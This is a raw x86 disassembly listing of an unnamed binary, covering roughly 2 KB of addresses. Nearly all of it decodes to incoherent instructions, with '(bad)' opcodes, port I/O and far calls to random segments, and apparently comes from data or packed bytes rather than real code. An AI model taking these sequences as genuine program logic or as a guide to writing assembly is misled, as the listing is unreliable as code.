  415994:	test   BYTE PTR [edx-0x12],0x52
  415998:	add    cl,bl
  41599a:	sub    ecx,DWORD PTR [edi]
  41599c:	adc    BYTE PTR [ecx+0x6172db10],bh
  4159a2:	sub    BYTE PTR [esp+ebx*1+0x6d],cl
  4159a6:	dec    eax
  4159a7:	shr    DWORD PTR [esi+0x52f2f0ad],0x53
  4159ae:	jae    0x415974
  4159b0:	dec    edi
  4159b1:	imul   esp,DWORD PTR [ecx-0x4b],0x7
  4159b5:	jp     0x4159c1
  4159b7:	or     eax,0xfe0ffe85
  4159bc:	jo     0x4159ef
  4159be:	or     eax,0xe465e4fc
  4159c3:	fnstenv [ebp-0x42]
  4159c6:	inc    eax
  4159c7:	div    BYTE PTR [eax]
  4159c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ca:	inc    BYTE PTR [ebp+0x59cb8a16]
  4159d0:	fcomp  QWORD PTR [ebp-0x71a1ce48]
  4159d6:	push   ss
  4159d7:	mov    ah,0x25
  4159d9:	popf   
  4159da:	loop   0x415a44
  4159dc:	imul   edx,DWORD PTR [esi],0x55
  4159df:	imul   edx,DWORD PTR [esi-0x4d],0xf5b49871
  4159e6:	xor    BYTE PTR [ebx+eiz*2],dh
  4159e9:	loopne 0x41599b
  4159eb:	push   0x7a
  4159ed:	comiss xmm2,DWORD PTR [edx+eax*4]
  4159f1:	sti    
  4159f2:	lods   al,BYTE PTR ds:[esi]
  4159f3:	pusha  
  4159f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159f5:	push   ds
  4159f6:	and    BYTE PTR [ecx],dh
  4159f8:	repz jo 0x4159d4
  4159fb:	outs   dx,BYTE PTR ds:[esi]
  4159fc:	int    0x53
  4159fe:	dec    ebp
  4159ff:	std    
  415a00:	call   0x1c0a:0x1ee55427
  415a07:	dec    ebp
  415a08:	out    dx,eax
  415a09:	shl    BYTE PTR [edx+eax*1-0x3a],1
  415a0d:	bound  esp,QWORD PTR [eax+0x78]
  415a10:	daa    
  415a11:	cmp    al,0x88
  415a13:	inc    edi
  415a14:	xchg   edx,eax
  415a15:	xchg   edx,eax
  415a16:	xor    DWORD PTR [edi],edx
  415a18:	mov    cl,0x35
  415a1a:	sbb    al,0xa1
  415a1c:	call   0x48a0:0x2b31bcdf
  415a23:	and    DWORD PTR [ebx+0x556b79fd],ecx
  415a29:	push   edx
  415a2a:	mov    ds:0x7348a23a,eax
  415a2f:	js     0x415a5a
  415a31:	fcomp  DWORD PTR [edi+0x24]
  415a34:	mov    ebx,0x29bd99d2
  415a39:	add    DWORD PTR [edx+0x4],edx
  415a3c:	out    0x5b,al
  415a3e:	shl    eax,0xa3
  415a41:	mov    ebp,0xd365953b
  415a46:	pop    edi
  415a47:	push   esi
  415a48:	seto   ch
  415a4b:	inc    eax
  415a4c:	into   
  415a4d:	dec    esi
  415a4e:	jb     0x415ac7
  415a50:	dec    esp
  415a51:	push   eax
  415a52:	(bad)  
  415a53:	push   ss
  415a54:	mov    ds:0x560acd8,eax
  415a59:	mov    bh,0xa
  415a5b:	mov    al,ds:0x20b4695e
  415a60:	in     eax,dx
  415a61:	aaa    
  415a62:	pop    ebx
  415a63:	stos   BYTE PTR es:[edi],al
  415a64:	mov    dh,0x18
  415a66:	pusha  
  415a67:	test   ah,ch
  415a69:	int3   
  415a6a:	call   FWORD PTR [ebx]
  415a6c:	(bad)  
  415a6d:	mov    eax,ds:0xeac9b39a
  415a72:	stos   BYTE PTR es:[edi],al
  415a73:	or     cl,BYTE PTR [eax]
  415a75:	pop    eax
  415a76:	pop    esi
  415a77:	call   0x4f52:0xb4100969
  415a7e:	nop
  415a7f:	out    dx,al
  415a80:	fld    QWORD PTR [ebx]
  415a82:	into   
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	ret    0x9e38
  415ab2:	(bad)  [esi+0x57]
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415a85
  415abc:	mov    esp,0x3a95775
  415ac1:	mov    edx,0x92173796
  415ac6:	add    al,0xec
  415ac8:	add    dh,BYTE PTR [eax-0x5d]
  415acb:	inc    ebp
  415acc:	into   
  415acd:	xor    DWORD PTR [edi-0x3b],ebx
  415ad0:	add    ah,BYTE PTR [ebp+0x7e]
  415ad3:	pop    ecx
  415ad4:	shl    esp,cl
  415ad6:	and    eax,edx
  415ad8:	dec    ebx
  415ad9:	mov    DWORD PTR [esi],edx
  415adb:	mov    cl,0x83
  415add:	dec    ebx
  415ade:	cmp    ebp,edx
  415ae0:	cmp    al,0x8
  415ae2:	(bad)  
  415ae3:	fsub   DWORD PTR [ecx-0x4f]
  415ae6:	js     0x415a6c
  415ae8:	test   BYTE PTR [ebx],dl
  415aea:	sub    BYTE PTR [ecx],ah
  415aec:	fcmovnb st,st(5)
  415aee:	mov    ds:0xbe4f0b3,eax
  415af3:	or     esp,DWORD PTR [edi+0x343d53c]
  415af9:	int3   
  415afa:	sub    DWORD PTR [ebp+0x60],edx
  415afd:	out    dx,al
  415afe:	imul   ebp,DWORD PTR [edx+0x5a],0xbe6fb509
  415b05:	mov    bp,0xe220
  415b09:	mov    cs,esi
  415b0b:	and    dl,bh
  415b0d:	mov    ebp,0xda0e980a
  415b12:	shl    BYTE PTR [edx+ebx*8+0x597e5e2e],1
  415b19:	test   BYTE PTR [ecx-0x6b],dl
  415b1c:	mov    bh,0xc7
  415b1e:	hlt    
  415b1f:	adc    edi,DWORD PTR [ecx+ebx*1+0x1d4b85ec]
  415b26:	std    
  415b27:	mov    WORD PTR [esi-0x55c6ea97],cs
  415b2d:	adc    DWORD PTR [edx+0x2d],esp
  415b30:	and    ecx,esp
  415b32:	scas   al,BYTE PTR es:[edi]
  415b33:	mov    DWORD PTR [edi+0x4befc371],ebp
  415b39:	and    ebp,DWORD PTR [edx+edx*4-0x53fea2f0]
  415b40:	sub    eax,0xfebccc81
  415b45:	adc    ch,BYTE PTR [ebx+0x67940e82]
  415b4b:	cmovb  esi,DWORD PTR [esi+0x713eba3d]
  415b52:	mov    WORD PTR [ecx-0x1465c1ee],gs
  415b58:	and    bl,BYTE PTR [ebp-0x459d2ae9]
  415b5e:	cld    
  415b5f:	rcl    DWORD PTR [ecx+ebx*2-0x7023e39d],0x8
  415b67:	gs pop ebp
  415b69:	pop    eax
  415b6a:	xchg   edi,eax
  415b6b:	or     eax,0x651524cf
  415b70:	cli    
  415b71:	cmp    edi,DWORD PTR [esp+ebp*4+0x29d2c097]
  415b78:	(bad)  
  415b79:	xchg   edi,eax
  415b7a:	push   ecx
  415b7b:	adc    DWORD PTR [ebx-0x46],0x20
  415b7f:	dec    eax
  415b80:	fs jle 0x415b94
  415b83:	loop   0x415b43
  415b85:	in     al,0xc9
  415b87:	fldenv [ebx]
  415b89:	arpl   di,dx
  415b8b:	adc    cl,BYTE PTR [ecx+edx*2-0x40]
  415b8f:	xor    DWORD PTR [esp+eiz*8],0xfffffffc
  415b93:	jb     0x415b4c
  415b95:	addr16 or eax,0xb62d556a
  415b9b:	adc    al,0x6a
  415b9d:	fdivr  QWORD PTR [esi-0x46c8bf67]
  415ba3:	jo     0x415b81
  415ba5:	mov    BYTE PTR [ebx],bl
  415ba7:	call   0x7d027d82
  415bac:	push   eax
  415bad:	data16 lock xlat BYTE PTR ds:[ebx]
  415bb0:	aad    0x50
  415bb2:	das    
  415bb3:	inc    edi
  415bb4:	sub    DWORD PTR [eax+0x78],eax
  415bb7:	pop    ebp
  415bb8:	lea    edx,[ebx+0x53]
  415bbb:	push   ebp
  415bbc:	cmp    al,0x28
  415bbe:	mov    esi,0x6fc76e81
  415bc3:	mov    ds:0xd7b5a5df,eax
  415bc8:	retf   0x36de
  415bcb:	aas    
  415bcc:	sbb    DWORD PTR [ebx+0x64],esp
  415bcf:	dec    ebp
  415bd0:	xor    edi,esi
  415bd2:	xor    BYTE PTR [edi],cl
  415bd4:	mov    esi,0x4de12d94
  415bd9:	and    cl,BYTE PTR [edx+esi*1-0x42]
  415bdd:	xor    BYTE PTR [esi+0xf],0xc0
  415be1:	mov    esp,0x775414cd
  415be6:	test   BYTE PTR [edx+0x2f],dh
  415be9:	(bad)  
  415bea:	aad    0x0
  415bec:	cmp    ecx,DWORD PTR [ebx]
  415bee:	xchg   edx,eax
  415bef:	jle    0x415c5c
  415bf1:	xchg   ebp,eax
  415bf2:	mov    gs,WORD PTR [eax]
  415bf4:	xor    DWORD PTR [ebx+0x2b2fd287],0x6c8fee68
  415bfe:	es mov esi,0x7c162acd
  415c04:	or     al,0x87
  415c06:	rcr    BYTE PTR [ebx+0x703ffa3c],1
  415c0c:	bound  eax,QWORD PTR [ebp-0x523ba216]
  415c12:	push   cs
  415c13:	test   DWORD PTR [edi+0x5358d46f],ecx
  415c19:	xchg   edi,eax
  415c1a:	(bad)  
  415c1b:	push   esi
  415c1c:	in     al,dx
  415c1d:	push   edi
  415c1e:	and    BYTE PTR [eax-0x1d],bl
  415c21:	jns    0x415c2a
  415c23:	inc    esi
  415c24:	ins    BYTE PTR es:[edi],dx
  415c25:	outs   dx,BYTE PTR ds:[esi]
  415c26:	jno    0x415c02
  415c28:	clc    
  415c29:	push   0x4b
  415c2b:	clc    
  415c2c:	je     0x415c53
  415c2e:	lock rcl BYTE PTR [ecx+0x58],1
  415c32:	das    
  415c33:	jo     0x415c2e
  415c35:	fiadd  DWORD PTR [edx-0x26]
  415c38:	cs into 
  415c3a:	out    dx,al
  415c3b:	adc    eax,0x53dfee9c
  415c40:	cmp    edx,DWORD PTR [esi+ebp*1+0x5aea4e04]
  415c47:	fdiv   DWORD PTR [edi+0x7355bdfb]
  415c4d:	jno    0x415c6e
  415c4f:	push   ss
  415c50:	rcl    BYTE PTR [esi+0x5d2d29ad],1
  415c56:	ret    
  415c57:	mov    bh,0x31
  415c59:	sbb    al,0x4a
  415c5b:	mov    esi,0xdbc03a5e
  415c60:	mov    edx,0x7d86cfa0
  415c65:	scas   eax,DWORD PTR es:[edi]
  415c66:	xor    eax,0xd685dafb
  415c6b:	xor    BYTE PTR [edx+0x67],bh
  415c6e:	out    0x72,al
  415c70:	aad    0x82
  415c72:	lahf   
  415c73:	mov    ebx,0x704ae6b8
  415c78:	or     ebx,DWORD PTR [esi-0x68]
  415c7b:	popa   
  415c7c:	push   esp
  415c7d:	aas    
  415c7e:	adc    DWORD PTR [edx+0x6e],edi
  415c81:	call   FWORD PTR [edi]
  415c83:	pop    esi
  415c84:	mov    edi,0x8bb50d71
  415c89:	push   esp
  415c8b:	fidiv  DWORD PTR [ecx]
  415c8d:	xor    eax,0x30a31a85
  415c92:	das    
  415c93:	out    dx,eax
  415c94:	push   edi
  415c95:	mov    esp,0x7334c417
  415c9a:	xor    DWORD PTR [ecx-0x1dc4d243],0x75
  415ca1:	inc    DWORD PTR [ebx-0x6d]
  415ca4:	and    DWORD PTR [ebx-0x64],esp
  415ca7:	imul   ebp,DWORD PTR [ecx],0x10e32180
  415cad:	shr    esp,1
  415caf:	sbb    DWORD PTR [ebx+0x34],esi
  415cb2:	push   edi
  415cb3:	or     al,0x37
  415cb5:	cmp    ch,bl
  415cb7:	inc    ebp
  415cb8:	retf   
  415cb9:	xchg   ebx,eax
  415cba:	add    ecx,DWORD PTR [eax-0xf]
  415cbd:	dec    edi
  415cbe:	jmp    0x415cad
  415cc0:	sub    esp,DWORD PTR [ecx]
  415cc2:	mov    ah,0xfd
  415cc4:	out    dx,al
  415cc5:	int3   
  415cc6:	sbb    ecx,DWORD PTR [ebx+0x21]
  415cc9:	bound  edx,QWORD PTR [edi-0x4b]
  415ccc:	pushf  
  415ccd:	imul   DWORD PTR [edi]
  415ccf:	adc    bh,BYTE PTR [edx+ebp*2]
  415cd2:	adc    eax,0xb5d50e68
  415cd7:	out    0xf8,eax
  415cd9:	adc    eax,DWORD PTR [edx-0x18]
  415cdc:	into   
  415cdd:	inc    esi
  415cde:	pop    edi
  415cdf:	dec    esp
  415ce0:	call   0xe51ff445
  415ce5:	fisub  WORD PTR [esi]
  415ce7:	mov    al,ds:0xa866626f
  415cec:	xchg   edi,eax
  415ced:	xchg   esi,eax
  415cee:	and    esi,DWORD PTR [eax+0x17a0d156]
  415cf4:	adc    al,0x64
  415cf6:	pop    ds
  415cf7:	les    ebx,FWORD PTR [ecx-0x77]
  415cfa:	dec    ecx
  415cfb:	add    BYTE PTR [esi],ch
  415cfd:	mov    dh,0x97
  415cff:	std    
  415d00:	add    ebp,DWORD PTR [ebx+eiz*1]
  415d03:	sbb    cl,BYTE PTR [eax]
  415d05:	fucomip st,st(5)
  415d07:	pop    esp
  415d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d09:	bound  ebx,QWORD PTR [edi+0x31aeb0f3]
  415d0f:	call   0x701c:0xc7863e8a
  415d16:	mov    ebx,eax
  415d18:	pusha  
  415d19:	loop   0x415ca0
  415d1b:	adc    ch,BYTE PTR [edi]
  415d1d:	std    
  415d1e:	sbb    ebx,DWORD PTR [edi]
  415d20:	shl    BYTE PTR [ebp+0x27],0x52
  415d24:	sbb    BYTE PTR [esi],dh
  415d26:	or     ecx,DWORD PTR [ebp-0x6b3beef7]
  415d2c:	jbe    0x415d64
  415d2e:	jnp    0x415d20
  415d30:	and    al,0x11
  415d32:	ror    BYTE PTR [eax+0x334ccda3],0x1c
  415d39:	fstp   TBYTE PTR [eax+0x18]
  415d3c:	mov    esp,0xea26d9ad
  415d41:	ins    BYTE PTR es:[edi],dx
  415d42:	pusha  
  415d43:	push   ss
  415d44:	push   ebx
  415d45:	popa   
  415d46:	mov    bl,0x27
  415d48:	ss fwait
  415d4a:	xchg   DWORD PTR [esi-0x54d9351b],ebx
  415d50:	jle    0x415d92
  415d52:	ja     0x415dcc
  415d54:	xchg   ebx,eax
  415d55:	in     al,0xc0
  415d57:	sub    al,BYTE PTR ds:0xd9503269
  415d5d:	push   edi
  415d5e:	sar    DWORD PTR [edi-0x12177deb],cl
  415d64:	and    ah,BYTE PTR [ecx+0x8]
  415d67:	out    dx,al
  415d68:	into   
  415d69:	sub    ebx,ecx
  415d6b:	out    dx,al
  415d6c:	popa   
  415d6d:	in     al,dx
  415d6e:	aas    
  415d6f:	ins    DWORD PTR es:[edi],dx
  415d70:	jmp    0x7637:0x9dc24950
  415d77:	das    
  415d78:	div    DWORD PTR [ebx+edx*2+0x77f44234]
  415d7f:	inc    edx
  415d80:	add    eax,0x16f11c21
  415d85:	mov    bh,0xbc
  415d87:	mov    bh,0x4e
  415d89:	std    
  415d8a:	and    eax,0xe1762396
  415d8f:	std    
  415d90:	sub    ecx,DWORD PTR [edi-0x692a0ef4]
  415d96:	js     0x415e02
  415d98:	adc    bh,BYTE PTR [ecx+ebx*8+0x361b798b]
  415d9f:	sbb    esp,DWORD PTR ds:0xdf1dc383
  415da5:	cmc    
  415da6:	jecxz  0x415df0
  415da8:	mov    ah,BYTE PTR [edi]
  415daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dab:	adc    edi,DWORD PTR [ebp+0x50]
  415dae:	pushf  
  415daf:	add    DWORD PTR [ebp-0xf189b90],0x42
  415db6:	jo     0x415ddb
  415db8:	jnp    0x415db4
  415dba:	mov    ebp,0x7653faf6
  415dbf:	fs adc cl,cl
  415dc2:	sub    BYTE PTR [ebx],dh
  415dc4:	xor    al,0xa0
  415dc6:	loop   0x415dd7
  415dc8:	or     al,al
  415dca:	inc    edx
  415dcb:	push   edx
  415dcc:	cld    
  415dcd:	clc    
  415dce:	mov    ebp,0x8d79063c
  415dd3:	iret   
  415dd4:	int    0x6b
  415dd6:	rcr    BYTE PTR [edi],1
  415dd8:	std    
  415dd9:	dec    edx
  415dda:	fs stos DWORD PTR es:[edi],eax
  415ddc:	jmp    0x415dae
  415dde:	aas    
  415ddf:	std    
  415de0:	les    ebx,FWORD PTR [eax]
  415de2:	lea    ebp,[ecx-0x4d]
  415de5:	mov    edx,0xd0662b5f
  415dea:	xor    ch,bl
  415dec:	test   BYTE PTR [esp+edi*8+0x17],cl
  415df0:	(bad)  
  415df1:	jmp    0xbe840159
  415df6:	into   
  415df7:	add    DWORD PTR [eax],0x15d46ef1
  415dfd:	cld    
  415dfe:	sub    al,0x6b
  415e00:	es add al,0x3d
  415e03:	xor    ecx,0x509821b
  415e09:	aam    0x77
  415e0b:	sahf   
  415e0c:	jo     0x415d9b
  415e0e:	stos   DWORD PTR es:[edi],eax
  415e0f:	mov    ch,0xc5
  415e11:	jg     0x415dd2
  415e13:	xor    bh,BYTE PTR [ecx-0x53]
  415e16:	xor    bl,bh
  415e18:	pop    es
  415e19:	dec    eax
  415e1a:	addr16 aad 0x6b
  415e1d:	push   edx
  415e1e:	dec    ebx
  415e1f:	fwait
  415e20:	and    dh,BYTE PTR [ebp+edi*1-0x2492f8a]
  415e27:	hlt    
  415e28:	aas    
  415e29:	adc    al,al
  415e2b:	out    0x6b,eax
  415e2d:	pop    ss
  415e2e:	xor    ebp,DWORD PTR [eax]
  415e30:	sub    cl,BYTE PTR [ecx+0x56]
  415e33:	sar    WORD PTR [ebp+0x79],1
  415e37:	xor    eax,0x25a9a2b6
  415e3c:	sbb    cl,BYTE PTR [edi]
  415e3e:	mov    esi,DWORD PTR [ecx+0x14]
  415e41:	add    al,0x34
  415e43:	push   edx
  415e44:	jns    0x415e34
  415e46:	scas   al,BYTE PTR es:[edi]
  415e47:	lods   al,BYTE PTR ds:[esi]
  415e48:	sub    al,0xf1
  415e4a:	mov    ebx,0x197f05a
  415e4f:	popf   
  415e50:	mov    ch,0xd
  415e52:	cwde   
  415e53:	mov    ebx,0x73571c36
  415e58:	add    DWORD PTR [ecx-0x30445c42],eax
  415e5e:	sti    
  415e5f:	dec    edx
  415e60:	aam    0x22
  415e62:	jb     0x415e7c
  415e64:	and    eax,0xe9d6dd94
  415e69:	cmp    DWORD PTR [eax+0x13],ebp
  415e6c:	xchg   ecx,eax
  415e6d:	das    
  415e6e:	inc    ebp
  415e6f:	stos   DWORD PTR es:[edi],eax
  415e70:	neg    DWORD PTR [ebp-0x5e]
  415e73:	jg     0x415eb4
  415e75:	(bad)  
  415e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e77:	pop    ebx
  415e78:	in     al,dx
  415e79:	fnclex 
  415e7b:	pushf  
  415e7c:	cmc    
  415e7d:	iret   
  415e7e:	jbe    0x415e25
  415e80:	nop
  415e81:	jmp    0x4312:0xf0445702
  415e88:	sbb    ebx,ebp
  415e8a:	xor    ch,ah
  415e8c:	jne    0x415ed6
  415e8e:	push   esp
  415e8f:	rol    BYTE PTR [ebx],cl
  415e91:	mov    al,ds:0xb46b1aa8
  415e96:	mov    ah,0xc8
  415e98:	push   edx
  415e99:	push   ss
  415e9a:	mov    ah,0xf0
  415e9c:	xchg   ebp,eax
  415e9d:	call   DWORD PTR [esi]
  415e9f:	idiv   ch
  415ea1:	int3   
  415ea2:	inc    al
  415ea4:	add    bl,0x9b
  415ea7:	xchg   ebp,eax
  415ea8:	scas   eax,DWORD PTR es:[edi]
  415ea9:	pop    ss
  415eaa:	cmc    
  415eab:	das    
  415eac:	mov    edi,0x2c09de24
  415eb1:	aaa    
  415eb2:	mov    WORD PTR [eax-0xbdd50fa],ss
  415eb8:	push   edx
  415eb9:	es dec edi
  415ebb:	push   edx
  415ebc:	add    DWORD PTR [eax-0x77],0x49
  415ec0:	out    0xc8,al
  415ec2:	lahf   
  415ec3:	or     ecx,DWORD PTR [ecx]
  415ec5:	and    DWORD PTR [esi+0x7177d6b7],edi
  415ecb:	ins    DWORD PTR es:[edi],dx
  415ecc:	mov    bl,0x95
  415ece:	test   DWORD PTR [edi],esi
  415ed0:	inc    edx
  415ed1:	push   ebp
  415ed2:	fwait
  415ed3:	sbb    al,0x3c
  415ed5:	inc    edi
  415ed6:	mov    dl,0xa1
  415ed8:	jae    0x415eec
  415eda:	jns    0x415e80
  415edc:	arpl   WORD PTR [edi+eax*4],cx
  415edf:	sbb    DWORD PTR [edi+ecx*1+0x693d1cf8],esi
  415ee6:	(bad)  
  415ee7:	call   0x1ac0:0xa332eec6
  415eee:	push   es
  415eef:	push   edx
  415ef0:	sbb    al,ah
  415ef2:	inc    esp
  415ef3:	pop    ecx
  415ef4:	inc    esp
  415ef5:	cmp    BYTE PTR [edi],0xa6
  415ef8:	sbb    al,0xb3
  415efa:	and    DWORD PTR [esi-0x6b],ecx
  415efd:	outs   dx,BYTE PTR ds:[esi]
  415efe:	mov    al,ds:0x100bb28a
  415f03:	call   0x3f18:0x31eacf4
  415f0a:	jle    0x415f5f
  415f0c:	call   0xd6b7743e
  415f11:	inc    esp
  415f12:	mov    ds:0xecc1a6f0,eax
  415f17:	or     edi,edi
  415f19:	and    bh,BYTE PTR [edi-0x5f]
  415f1c:	add    al,0x91
  415f1e:	dec    ebx
  415f1f:	daa    
  415f20:	sbb    DWORD PTR [edi+ebp*1-0x37],esp
  415f24:	add    edi,esp
  415f26:	adc    BYTE PTR ds:0x28b6d69,bh
  415f2c:	mov    ebx,0xcdc64d61
  415f31:	add    BYTE PTR [esi+0x7e],ch
  415f34:	ja     0x415f16
  415f36:	icebp  
  415f37:	mov    ch,0xe3
  415f39:	es jb  0x415ecd
  415f3c:	pop    esi
  415f3d:	dec    ebp
  415f3e:	xchg   edi,eax
  415f3f:	and    BYTE PTR [eax-0x818241c],al
  415f45:	inc    ecx
  415f46:	dec    dh
  415f48:	clc    
  415f49:	cmp    BYTE PTR [ebx+edx*1+0x4676a083],bl
  415f50:	push   ecx
  415f51:	push   eax
  415f52:	in     al,dx
  415f53:	xor    BYTE PTR [ebx-0x3c0ffec2],dh
  415f59:	popa   
  415f5a:	fild   WORD PTR [ebx+0x27]
  415f5d:	ja     0x415fd9
  415f5f:	mov    ebx,0xfb6d9c89
  415f64:	les    ecx,FWORD PTR [esi]
  415f66:	out    dx,al
  415f67:	xchg   esi,eax
  415f68:	ja     0x5917cc59
  415f6e:	and    edi,DWORD PTR [ebx-0x7a]
  415f71:	jmp    0xab91:0x216992b4
  415f78:	lds    ebp,FWORD PTR [edx-0x4008a044]
  415f7e:	pusha  
  415f7f:	es repz fcomi st,st(4)
  415f83:	div    ecx
  415f85:	fdivr  DWORD PTR [esi-0x16]
  415f88:	ds das 
  415f8a:	imul   ebp,DWORD PTR [edx-0x2a7981e9],0x87d6db01
  415f94:	retf   
  415f95:	or     esp,DWORD PTR [ebx+0x55746a5f]
  415f9b:	sub    dh,BYTE PTR [edi+0x27]
  415f9e:	fist   DWORD PTR [ebx]
  415fa0:	lock call 0xe5db:0x84b68980
  415fa8:	call   DWORD PTR [ecx]
  415faa:	jno    0x415fe6
  415fac:	(bad)  
  415fad:	ret    
  415fae:	jl     0x415f71
  415fb0:	adc    ebx,esp
  415fb2:	push   edx
  415fb3:	push   ecx
  415fb4:	xchg   esi,eax
  415fb5:	je     0x415fcc
  415fb7:	xor    ah,cl
  415fb9:	dec    edi
  415fba:	loop   0x41602e
  415fbc:	dec    eax
  415fbd:	inc    esp
  415fbe:	test   eax,0x2a33c3c1
  415fc3:	mov    al,cl
  415fc5:	mov    cl,0xbf
  415fc7:	dec    eax
  415fc8:	outs   dx,DWORD PTR ds:[esi]
  415fc9:	sub    al,0x83
  415fcb:	dec    ebp
  415fcc:	dec    esi
  415fcd:	dec    BYTE PTR [edx]
  415fcf:	mov    esi,0x3610ba9b
  415fd4:	mov    esi,0xb9856a80
  415fd9:	mov    ah,0x84
  415fdb:	xchg   esp,eax
  415fdc:	fisttp WORD PTR ds:0x5764ff96
  415fe2:	xchg   edx,eax
  415fe3:	pop    ebx
  415fe4:	sahf   
  415fe5:	es push esp
  415fe7:	int3   
  415fe8:	cmp    DWORD PTR [esi-0x720a0f5c],0x9145bf97
  415ff2:	sub    eax,0xee6d820
  415ff7:	xchg   ebp,eax
  415ff8:	repz and bh,BYTE PTR [edx]
  415ffb:	mov    DWORD PTR [edi+0x4f75bb6b],edi
  416001:	and    esi,ecx
  416003:	jmp    0x416002
  416005:	stos   BYTE PTR es:[edi],al
  416006:	jno    0x41602e
  416008:	add    BYTE PTR [edi-0x6ec9a3a],bh
  41600e:	hlt    
  41600f:	xor    eax,0x56fae473
  416014:	outs   dx,DWORD PTR ds:[esi]
  416015:	retf   
  416016:	test   BYTE PTR [ebx+0x2d],dh
  416019:	push   es
  41601a:	mov    DWORD PTR [edi+0x2df6545c],ebx
  416020:	stc    
  416021:	ins    DWORD PTR es:[edi],dx
  416022:	ins    BYTE PTR es:[edi],dx
  416023:	int    0x12
  416025:	push   ebx
  416026:	cmp    al,0xcc
  416028:	shl    bh,cl
  41602a:	jmp    0xc10f:0xb0037882
  416031:	lods   al,BYTE PTR ds:[esi]
  416032:	and    DWORD PTR [eax+0x3cd90300],0xa1dc2900
  41603c:	mov    al,ds:0x34211459
  416041:	jo     0x416001
  416043:	sub    eax,0xdf966181
  416048:	daa    
  416049:	hlt    
  41604a:	sbb    DWORD PTR [ecx+0x60],ecx
  41604d:	push   ebx
  41604e:	into   
  41604f:	test   DWORD PTR [eax-0x63],0x1875562
  416056:	ret    0x8ce9
  416059:	sub    dl,al
  41605b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605c:	lahf   
  41605d:	jae    0x416020
  41605f:	mov    bl,0xa
  416061:	dec    esp
  416062:	rcr    BYTE PTR [edi+edi*2-0x4f3a1c02],0xd0
  41606a:	lahf   
  41606b:	(bad)  
  41606c:	les    ecx,FWORD PTR [ecx-0x3d43f084]
  416072:	jno    0x4160d7
  416074:	or     BYTE PTR [edi-0x2d],dh
  416077:	test   BYTE PTR [ebx+0x23fb71af],ch
  41607d:	inc    eax
  41607e:	cdq    
  41607f:	stc    
  416080:	nop
  416081:	sbb    cl,BYTE PTR [esp+eiz*8]
  416084:	sub    al,0xc5
  416086:	xchg   DWORD PTR [ecx+edx*1-0x7fe09c57],edi
  41608d:	ss pop ebp
  41608f:	mov    gs,WORD PTR [edi+edi*4-0x51]
  416093:	push   esi
  416094:	adc    dl,BYTE PTR [edx-0x545f9167]
  41609a:	pop    ebp
  41609b:	xchg   ebp,eax
  41609c:	mov    ecx,0x94e254d7
  4160a1:	and    ah,cl
  4160a3:	or     eax,0x6dd1bc07
  4160a8:	sar    BYTE PTR [esp+esi*1],cl
  4160ab:	lds    edx,FWORD PTR [esi+0x55]
  4160ae:	inc    ebp
  4160af:	or     al,0xcd
  4160b1:	xchg   ecx,eax
  4160b2:	popf   
  4160b3:	cmp    BYTE PTR [edi+0x8],ah
  4160b6:	xchg   esi,edx
  4160b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b9:	mov    esi,0x2bb3cfe9
  4160be:	mov    ds:0x989722fa,eax
  4160c3:	arpl   WORD PTR [edx-0x36],bp
  4160c6:	push   es
  4160c7:	cmp    BYTE PTR [esi-0x53],ch
  4160ca:	rcl    DWORD PTR [edx+0x678adec6],1
  4160d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d1:	aaa    
  4160d2:	mov    ds:0xc40f5d29,eax
  4160d7:	xchg   DWORD PTR [edi+0x71],eax
  4160da:	mov    edi,0xcb098168
  4160df:	xchg   ebx,eax
  4160e0:	mov    al,0xc4
  4160e2:	popa   
  4160e3:	add    al,0x2f
  4160e5:	fadd   DWORD PTR [edi]
  4160e7:	in     al,dx
  4160e8:	adc    DWORD PTR [ebx],edi
  4160ea:	jae    0x416131
  4160ec:	and    eax,0x4455bfdf
  4160f1:	inc    DWORD PTR [ebx+eax*8+0x5b910acd]
  4160f8:	(bad)  
  4160f9:	enter  0xcac7,0xb7
  4160fd:	dec    edx
  4160fe:	ja     0x416132
  416100:	mov    eax,0x50bc9269
  416105:	cld    
  416106:	add    eax,eax
  416108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416109:	or     DWORD PTR [ecx],eax
  41610b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41610c:	sbb    esp,esi
  41610e:	int3   
  41610f:	dec    edx
  416110:	adc    bl,ch
  416112:	push   es
  416113:	push   es
  416114:	mov    esi,0xadbd4b4c
  416119:	cld    
  41611a:	mov    esi,ecx
  41611c:	rcr    eax,cl
  41611e:	daa    
  41611f:	in     eax,dx
  416120:	cmp    DWORD PTR [esi*4-0x54447c09],0x20705c39
  41612b:	ficomp WORD PTR [eax-0x6e3e4398]
  416131:	dec    esi
  416132:	pop    eax
  416133:	rcl    DWORD PTR [eax],cl
  416135:	stos   BYTE PTR es:[edi],al
  416136:	push   0x747c34f4
  41613b:	mov    esp,0x35193d53
  416140:	jl     0x41612c
  416142:	fistp  WORD PTR [esi+0x3f1e5086]
  416148:	xchg   ebp,eax
  416149:	je     0x4160e3
  41614b:	xchg   edi,eax
  41614c:	or     DWORD PTR [edx],edx
  41614e:	dec    ebx
  41614f:	setge  dl
  416152:	adc    ebx,esp
  416154:	dec    edi
  416155:	imul   esp,DWORD PTR [eax+ebx*4+0xe7538fb],0x15
  41615d:	pop    ebx
  41615e:	xor    al,0xe6
  416160:	sbb    eax,0x36808fb6
  416165:	cmp    al,0xd
  416167:	push   ebp
  416168:	adc    eax,0x857092d7
  41616d:	ret    
  41616e:	adc    BYTE PTR [edi],bh
  416170:	jae    0x416191
  416172:	sbb    BYTE PTR [ebp+0x12],dl
